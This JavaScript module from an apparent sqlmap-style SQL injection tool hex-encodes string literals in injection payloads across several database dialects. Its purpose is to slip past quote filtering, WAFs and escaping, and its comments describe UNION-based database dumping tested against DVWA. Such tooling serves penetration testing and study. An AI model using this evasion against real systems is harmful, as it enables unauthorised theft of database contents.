// ============================================================================
// hexLiteral.js —— 字符串字面量的十六进制化（对标 sqlmap --hex）
// ============================================================================
// [D301] 统一错误形态：本文件的不可用/未生效走 AppError(ErrorCode.EXTRACT_FAILED)（错误
// 形态门禁口径——裸 Error 只减不增），调用方 catch 后按「warn + 保持普通形态」降级。
import { AppError, ErrorCode } from '../core/errors.js';

// 用途：目标存在引号过滤 / WAF 拦 `'`、`%` 时，把字符常量转成十六进制字面量，
// 让 payload 里不出现引号与百分号：`name LIKE 0x2561...` 而不是 `name LIKE '%a%'`。
//
// 【为什么只支持部分方言】
// 十六进制字面量的写法**各库完全不同**，写错就是一条"看起来能用其实不能用"的 SQL：
//   MySQL/MariaDB → 0x6162      PostgreSQL → decode('6162','hex')（没有 0x 字面量）
//   SQL Server    → 0x6162      SQLite      → x'6162'
//   Oracle        → HEXTORAW('6162')
// 【各库写法与证据分层】
//   方言            形态                                  证据
//   MySQL/MariaDB   0x6162                                真机 HTTP（DVWA sqli medium 拖库种子 5/5）
//   TiDB            0x6162                                同 MySQL 家族（未单库起服）
//   PostgreSQL      convert_from(decode('6162','hex'),'UTF8')  PGlite（PostgreSQL 17 WASM）语义验证
//   SQLite          CAST(x'6162' AS TEXT)                 node:sqlite 语义验证（等值/ LIKE /空串）
//   SQL Server      0x6162                                **未验证**（varbinary 与 varchar 依赖隐式转换）
// 未实现的方言（Oracle HEXTORAW / DB2 等）显式抛错：宁可说"不支持"，也不静默产出错误 SQL。
// ============================================================================

const HEX_FNS = {
  // MySQL / MariaDB / TiDB：0x 前缀十六进制字面量，可直接当字符串用
  MySQL: (hex) => `0x${hex}`,
  MariaDB: (hex) => `0x${hex}`,
  TiDB: (hex) => `0x${hex}`,
  SQLServer: (hex) => `0x${hex}`,
  // PostgreSQL：无 0x 字面量；decode(...,'hex') 返回 bytea，
  //   与 text 比较需要 convert_from → 但 LIKE 场景下用 `col LIKE convert_from(...)` 可行
  PostgreSQL: (hex) => `convert_from(decode('${hex}','hex'),'UTF8')`,
  // SQLite：`x''` 是 BLOB。**LIKE 场景可用，等值场景不成立**——真引擎实测（node:sqlite）：
  //   `SELECT 'abc' = x'616263'` → 0        （BLOB 与 TEXT 类型不同，永不相等）
  //   `SELECT 'abc' = CAST(x'616263' AS TEXT)` → 1
  //   `SELECT 'abc' LIKE x'256125'` → 1 / LIKE CAST(...) → 1
  // 提取链（[D301]）大量使用**等值**比较（标记定位 / WHERE table_schema='…' / SEPARATOR），
  // 旧形态 `x'…'` 在这类上下文恒假 ⇒ 拖库静默空结果。统一 CAST 成 TEXT（LIKE 语义不变）。
  SQLite: (hex) => `CAST(x'${hex}' AS TEXT)`,
};

/** 已支持 --hex 的方言（仅这些经过真机验证或语法确认） */
export const HEX_SUPPORTED_DBMS = Object.keys(HEX_FNS);

/**
 * 把字符串转成目标方言的十六进制字面量。
 * @param {string} str 原始字符串
 * @param {string} edb resolveDbms() 之后的方言名
 * @returns {string} 十六进制字面量表达式
 * @throws {Error} 该方言不支持时抛错（调用方应给出明确提示，不要静默回退成普通字符串）
 */
export function toHexLiteral(str, edb) {
  const fn = HEX_FNS[edb];
  if (!fn) {
    throw new AppError(ErrorCode.EXTRACT_FAILED,
      `--hex 暂不支持 ${edb}（已验证方言：${HEX_SUPPORTED_DBMS.join('/')}）。` +
        '各库十六进制字面量写法不同，未经验证不会产生静默错误的 SQL——请去掉 --hex 后重试。'
    );
  }
  const hex = Buffer.from(String(str), 'utf8').toString('hex').toUpperCase();
  return fn(hex);
}

/**
 * 构造 LIKE 模式。
 * 未开启 hex 时保持原行为（单引号转义），零回归。
 */
export function buildLikePattern(searchTerm, edb, useHex) {
  const pattern = `%${String(searchTerm)}%`;
  if (!useHex) return `'%${String(searchTerm).replace(/'/g, "''")}%'`;
  return toHexLiteral(pattern, edb);
}

/**
 * 把「搜索类」SQL 模板里已生成的 LIKE 模式字面量替换成十六进制形态。
 *
 * 为什么走"替换"而不是改模板：搜索 SQL 是 per-dialect 字符串模板
 * （SEARCH_COLUMNS_QUERY / SEARCH_TABLES_QUERY 各 10+ 个方言），
 * 逐个改成函数调用既冗长又容易漏；而它们生成的形态是统一的
 * `LIKE '%<escSql(term)>%'`，替换一处即可覆盖全部方言。
 *
 * 降级策略：方言不支持 --hex 时**不改变 SQL**（保持普通形态）并把原因交给调用方记日志——
 * 既不产出错误 SQL，也不静默假装生效。
 *
 * @param {string} sql 模板渲染后的 SQL
 * @param {string} searchTerm 搜索词
 * @param {string} edb resolveDbms() 后的方言名
 * @param {boolean} useHex 是否开启 --hex
 * @returns {string} 可能被替换后的 SQL
 */
export function hexifyLikeInQuery(sql, searchTerm, edb, useHex) {
  if (!useHex) return sql;
  const plain = `'%${String(searchTerm).replace(/'/g, "''")}%'`;
  if (!sql.includes(plain)) return sql;
  return sql.replace(plain, toHexLiteral(`%${String(searchTerm)}%`, edb));
}

/**
 * 把 SQL 里**引擎自己拼出来的**单引号字符串字面量整体替换成十六进制字面量（[D301 GAP①]）。
 *
 * 用途：real_escape_string 全站逃逸的目标（DVWA sqli medium 形态）上，提取链的带引号标记
 * （`'__S__'`/`'__E__'`）与模板字面量（`SEPARATOR ','`、`WHERE table_schema='…'`）会被
 * 全部转义致死 ⇒ 拖库静默全空。hexify 后 payload 不再含任何引号，转义无从作用。
 *
 * 范围口径：只处理「未转义的成对单引号」字面量（`''` 为转义引号、不识别反斜杠转义——
 * 本引擎全部模板走 escSql 的 `''` 加倍口径，见 escSql 定义）；未闭合的引号尾巴原样保留
 * （防御：payload 的闭合引号/注释残片不被误吞）。零字面量时抛错——让调用方把
 * 「--hex 没生效」喊出来，而不是静默假装生效。
 *
 * @param {string} sql 组装完成的提取 SQL（UNION payload）
 * @param {string} edb resolveDbms() 之后的方言名
 * @returns {string} 字面量十六进制化后的 SQL
 * @throws {Error} 方言不支持或无可转换字面量时抛错（调用方 warn 后保持普通形态）
 */
export function hexifyStringLiterals(sql, edb) {
  // 空字符串字面量（''）的特殊形态：hex('') = 0x（无数字）在 MySQL 是语法错误
  //（实测 DVWA medium：nnExpr 的 IFNULL(...,'') 被 hexify 成裸 0x ⇒ 全部 data 查询
  // "Unknown column '0x'" ⇒ 拖库 0 行）。用「零次重复」构造空串：零引号且语义等价。
  const EMPTY_STR = { MySQL: 'REPEAT(0x30,0)', MariaDB: 'REPEAT(0x30,0)', TiDB: 'REPEAT(0x30,0)' };
  const emptyExpr = EMPTY_STR[edb];
  let out = '';
  let i = 0;
  let converted = 0;
  let brokeEarly = false;
  while (i < sql.length) {
    if (sql[i] !== "'") { out += sql[i]; i += 1; continue; }
    let j = i + 1;
    let content = '';
    let closed = false;
    while (j < sql.length) {
      if (sql[j] === "'") {
        if (sql[j + 1] === "'") { content += "'"; j += 2; continue; }
        closed = true;
        j += 1;
        break;
      }
      content += sql[j];
      j += 1;
    }
    if (!closed) { out += sql.slice(i); brokeEarly = true; break; }
    out += content === '' ? emptyExpr : toHexLiteral(content, edb);
    converted += 1;
    i = j;
  }
  if (converted === 0 && !brokeEarly) {
    // 全串无字面量（纯数字/无引号形态）⇒ hex 化无事可做：抛错让调用方把
    // 「--hex 没生效」喊出来，而不是静默假装生效。未闭合残片（brokeEarly）不抛：
    // 原样保留本身就是正确行为，不该把畸形 payload 变成一次误报的失败。
    throw new AppError(ErrorCode.EXTRACT_FAILED, 'payload 中没有可十六进制化的字符串字面量（纯数字/无引号形态本就免转义）');
  }
  return out;
}

export default toHexLiteral;
